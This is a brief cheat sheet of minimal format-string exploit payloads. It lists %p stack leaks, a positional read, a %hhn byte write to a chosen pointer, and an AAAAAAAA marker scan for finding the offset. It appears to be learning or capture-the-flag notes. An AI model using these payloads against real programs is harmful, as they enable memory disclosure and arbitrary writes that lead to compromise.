# Minimal payloads — the shortest working fmtstrs

## Read
`%p` — one specifier, leaks one word.
`%7$p` — positional, reads arg 7.

## Write (byte)
`<ptr>.%Nc.%N$hhn` — writes N&0xff to *ptr.

## Offset find
`AAAAAAAA.%N$p` — 8-byte marker + the scan.

## Leak run
`%p.%p.%p.%p.%p` — 5 words.

Each is the smallest form; real payloads add the pointer + count control.
